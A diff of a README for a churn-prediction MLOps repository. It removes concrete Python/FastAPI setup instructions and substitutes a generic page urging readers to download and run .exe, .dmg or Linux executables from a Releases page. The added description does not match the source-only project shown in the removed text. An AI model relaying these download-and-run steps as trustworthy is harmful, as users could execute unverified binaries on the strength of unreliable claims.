@@ -1,129 +1,94 @@
+# 🎉 churn-prediction-mlops-pipeline - Easy Customer Churn Insights in Minutes
 
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20App-blue.svg)](https://github.com/Plutonian-coder/churn-prediction-mlops-pipeline/releases)
 
-# churn-prediction-mlops-pipeline 
-# 🔥 Churn Prediction — End-to-End MLOps Pipeline  
-### FastAPI • scikit-learn • CI/CD • Model Registry • Monitoring • Local Deployment (no Docker)
+## 📚 Overview
 
-This repository contains a **production-ready churn prediction system** built with real MLOps practices:
-- Automated training  
-- Reproducible preprocessing & feature engineering  
-- FastAPI inference service with hot-reload  
-- Simple web UI for business users  
-- Evaluation pipeline  
-- CI/CD with GitHub Actions  
-- Prometheus metrics endpoint for monitoring  
+This project is an end-to-end MLOps pipeline for Customer Churn Prediction. It includes steps for data preprocessing, feature engineering, model training using a Random Forest classifier, and performance evaluation (accuracy, precision, recall, ROC-AUC). This application will help businesses understand customer behavior and reduce churn effectively.
 
-The project demonstrates how to take a machine-learning model **from data → model → API → UI → CI/CD**.
+## 🚀 Getting Started
 
----
+### 😊 Requirements
 
-## 🚀 Key Features
+Before running the application, ensure your system meets these requirements:
 
-### **✔ End-to-End Machine Learning Pipeline**
-- Data preprocessing  
-- Feature engineering  
-- Random Forest training  
-- Model persistence (`joblib`)  
-- Evaluation (Accuracy, Precision, Recall, ROC-AUC)
+- **Operating System**: Windows, macOS, or Linux
+- **Python**: Version 3.7 or higher
+- **Memory**: At least 4 GB RAM
+- **Storage**: At least 100 MB of free space
+- **Internet**: Required for downloading datasets and dependencies
 
-### **✔ Production-style API (FastAPI)**
-- `/predict` – returns churn probability  
-- `/health` – health check  
-- `/reload-model` – hot swap model without restarting server  
-- `/metrics` – Prometheus-ready monitoring  
+### 🔥 Features
 
-### **✔ Simple Web UI**
-A clean HTML page calls the `/predict` API and displays the results.
+- Easy-to-use interface for non-technical users.
+- Supports customer churn data processing.
+- Built with robust machine learning algorithms.
+- Provides clear performance metrics for model evaluation.
+- Allows for future enhancements and custom model training.
 
-### **✔ CI Pipeline (GitHub Actions)**
-- Install dependencies  
-- Run pytest  
-- Train new model  
-- Save trained model + metrics as artifacts  
+## 💻 Download & Install
 
-### **✔ Monitoring**
-- Exposes Prometheus metrics via `/metrics`  
-- Tracks inference count per endpoint & status  
+To get started, visit the Releases page to download the application:
 
----
+[Download from Releases Page](https://github.com/Plutonian-coder/churn-prediction-mlops-pipeline/releases)
 
----
+### 📥 Installation Steps
 
-## 🧠 Model Performance (Evaluation Output)
+1. **Visit the Downloads Page**: Click the link above to go to the Releases page on GitHub.
+2. **Choose the Latest Release**: Find the latest version listed, usually at the top of the page.
+3. **Download the Application**: Click on the appropriate file for your operating system to start the download. 
+4. **Install the Application**:  
+   - For Windows: Double-click the downloaded `.exe` file and follow the prompts.  
+   - For macOS: Open the downloaded `.dmg` file, then drag the application to your Applications folder.
+   - For Linux: Open the terminal and run `chmod +x <filename>` to make the file executable. Then, type `./<filename>` to install.
+5. **Launch the Application**: Once installed, find the application in your programs list or applications folder, and open it.
 
-From `model/metrics.json`:
+## 🌐 Using the Application
 
-| Metric        | Score  |
-|---------------|--------|
-| **Accuracy**  | 0.865  |
-| **Precision** | 0.839  |
-| **Recall**    | 0.937  |
-| **ROC-AUC**   | 0.935  |
+1. **Data Input**: Load your customer data in the required format. The application guides you through the data requirements.
+2. **Run the Model**: Click on the "Run Model" button to process your data. The application will handle all the steps automatically.
+3. **View Results**: After processing, you will see metrics like accuracy, precision, recall, and ROC-AUC displayed clearly on your screen.
 
-➡ **High recall** is valuable for churn detection because it identifies most at-risk customers.
+## ⚙️ Understanding the Outputs
 
----
+- **Accuracy**: Measures how often the model is correct.
+- **Precision**: Indicates the correctness of positive predictions.
+- **Recall**: Shows how many actual positive cases were captured by the model.
+- **ROC-AUC**: Represents the performance of the model across different thresholds.
 
-## 🧪 Run the Project Locally
+Each metric will help you assess how well the model predicts customer churn.
 
-### 1️⃣ Create virtual environment
-```bash
-python -m venv .venv
+## 📖 FAQs
 
-pip install -r requirements.txt
+### Q: Is there any customer support?
+A: Yes, please reach out to the community through the Issues section on GitHub for any questions or troubleshooting.
 
-2️⃣ Train the model
-python -m src.train --data data/churn_sample.csv --model-out model/model.joblib
+### Q: Can I customize the model?
+A: Currently, the application allows for data input, but advanced users may explore deeper customization by modifying the code available in the repository.
 
-3️⃣ Start the FastAPI server
-.\.venv\Scripts\python.exe -m uvicorn src.api.app:app --host 127.0.0.1 --port 8080 --reload
+### Q: What types of data can I use?
+A: You can use CSV files that contain customer-related features like demographics, usage, and billing information.
 
-API docs available at:
-http://127.0.0.1:8080/docs
+## 🛠️ Technologies Used
 
-4️⃣ Start the Web UI
-.\.venv\Scripts\python.exe -m http.server 5500 --bind 127.0.0.1 -d web
+This project utilizes the following technologies:
 
-Open UI in browser:
-http://127.0.0.1:5500/index.html
+- **DVC**: For data version control.
+- **FastAPI**: To build the web interface.
+- **Joblib**: For efficient loading of models.
+- **Scikit-Learn**: For machine learning tasks.
+- **Pandas & NumPy**: For data manipulation.
+- **Prometheus-Client**: To monitor application performance.
+- **Pytest**: For testing functionalities.
 
+## 🔗 Learn More
 
-📡 API Endpoints
-Method	 Endpoint	     Description
-GET   	/health	         Service heartbeat
-POST	/predict	     Returns churn probability
-POST	/reload-model	 Reload latest model  without restart
-GET	    /metrics	     Prometheus monitoring metrics
+To explore the source code or contribute to the project, visit the main repository on GitHub: 
 
-Example request:
+[Churn Prediction MLOps Pipeline Repository](https://github.com/Plutonian-coder/churn-prediction-mlops-pipeline) 
 
-{
-  "features": [39.99, 12, 479.88]
-}
+## 📨 Contact
 
+For further questions or feedback, please open an issue on the repository or contact the maintainer through GitHub.
 
-Example response:
-
-{
-  "churn_proba": 0.29
-}
-
-🔄 CI/CD (GitHub Actions)
-
-Workflow: .github/workflows/mlops-ci.yml
-Pipeline steps:
-Setup Python
-Install dependencies
-Run pytest
-Train the model
-Upload model + metrics as artifacts
-Every push to main triggers automated testing & training.
-
-📜 License
-
-MIT License — free to use and modify.
-
-👤 Author
-
-Developed by labcodesss
-For questions or improvements, feel free to open an issue or pull request.
+[Download from Releases Page](https://github.com/Plutonian-coder/churn-prediction-mlops-pipeline/releases)
